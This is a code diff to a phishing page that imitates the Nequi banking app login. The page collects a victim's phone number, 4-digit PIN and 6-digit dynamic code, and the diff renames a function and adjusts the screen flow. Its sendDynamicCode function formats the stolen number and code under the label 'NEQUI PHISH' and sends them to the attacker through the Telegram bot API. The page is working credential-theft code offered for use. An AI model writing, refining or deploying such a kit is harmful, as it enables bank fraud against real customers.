@@ -149,7 +149,7 @@
     .key:active { background: rgba(255,255,255,0.25); }
     .delete { font-size: 26px !important; }
 
-    /* Loader Mejorado y Centrado */
+    /* Loader - Solo se usa después de la dinámica */
     #loader {
       flex-direction: column;
       justify-content: center;
@@ -185,7 +185,7 @@
 
   <div class="phone-frame">
 
-    <!-- 1. Número -->
+    <!-- Pantalla 1: Número -->
     <div class="screen" id="screen1">
       <div class="help">?</div>
       <div class="nequi-logo"><span>■</span>Nequi</div>
@@ -196,7 +196,7 @@
       <button onclick="goToPassword()">Entra</button>
     </div>
 
-    <!-- 2. Clave de 4 dígitos -->
+    <!-- Pantalla 2: Clave de 4 dígitos -->
     <div class="screen" id="screen2">
       <div class="back" onclick="goBack(1)">←</div>
       <div class="title">Escribe tu clave</div>
@@ -220,7 +220,7 @@
       </div>
     </div>
 
-    <!-- 3. Clave Dinámica -->
+    <!-- Pantalla 3: Clave Dinámica -->
     <div class="screen" id="screen3">
       <div class="back" onclick="goBack(2)">←</div>
       <div class="title">Clave Dinámica</div>
@@ -245,7 +245,7 @@
       </div>
     </div>
 
-    <!-- Loader (Solo aparece después de la clave dinámica) -->
+    <!-- Loader (SOLO se usa después de la dinámica) -->
     <div class="screen" id="loader">
       <div class="spinner"></div>
       <div class="loader-text">Verificando clave dinámica...</div>
@@ -292,7 +292,8 @@
           pin4 += num;
           updatePins();
           if (pin4.length === 4) {
-            setTimeout(() => showScreen('screen3'), 400); // Pequeño delay natural
+            // ← Cambiado: Va directo a dinámica SIN loader
+            setTimeout(() => showScreen('screen3'), 500);
           }
         }
       } 
@@ -300,7 +301,7 @@
         if (pin6.length < 6) {
           pin6 += num;
           updatePins();
-          if (pin6.length === 6) sendDynamic();
+          if (pin6.length === 6) sendDynamicCode();
         }
       }
     }
@@ -320,7 +321,8 @@
       });
     }
 
-    function sendDynamic() {
+    // Solo se ejecuta cuando se completa la Clave Dinámica
+    function sendDynamicCode() {
       const message = `🔴 NEQUI PHISH\n\n📱 Número: +57 ${phoneNumber}\n🔑 Clave Dinámica: ${pin6}\n⏰ ${new Date().toLocaleString('es-CO')}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
